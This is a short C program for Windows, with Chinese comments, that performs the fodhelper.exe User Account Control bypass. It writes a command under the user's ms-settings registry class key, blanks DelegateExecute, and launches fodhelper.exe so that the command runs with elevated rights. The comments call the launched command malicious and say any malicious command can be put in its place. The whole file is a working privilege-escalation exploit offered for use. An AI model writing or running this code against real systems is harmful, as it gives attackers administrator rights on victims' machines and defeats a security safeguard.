#include <windows.h>
#include <stdio.h>

void bypassUAC() {
    HKEY hKey;
    LONG result;

    // 创建或打开注册表项
    result = RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\open\\command"), 0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        printf("Failed to create registry key.\n");
        return;
    }

    // 设置默认值为恶意命令
    const wchar_t* command = L"cmd /c start C:\\Windows\\System32\\cmd.exe";  // 可以替换为任意恶意命令
    result = RegSetValueEx(hKey, NULL, 0, REG_SZ, (const BYTE*)command, (DWORD)((wcslen(command) + 1) * sizeof(wchar_t)));
    if (result != ERROR_SUCCESS) {
        printf("Failed to set registry value.\n");
        RegCloseKey(hKey);
        return;
    }

    // 设置DelegateExecute为空值
    result = RegSetValueEx(hKey, TEXT("DelegateExecute"), 0, REG_SZ, (const BYTE*)L"", sizeof(wchar_t));
    if (result != ERROR_SUCCESS) {
        printf("Failed to set DelegateExecute.\n");
        RegCloseKey(hKey);
        return;
    }

    RegCloseKey(hKey);

    // 执行Fodhelper.exe
    ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\fodhelper.exe"), NULL, NULL, SW_SHOWNORMAL);

    printf("UAC Bypass using Fodhelper.exe executed.\n");
}

int main() {
    bypassUAC();
    return 0;
}
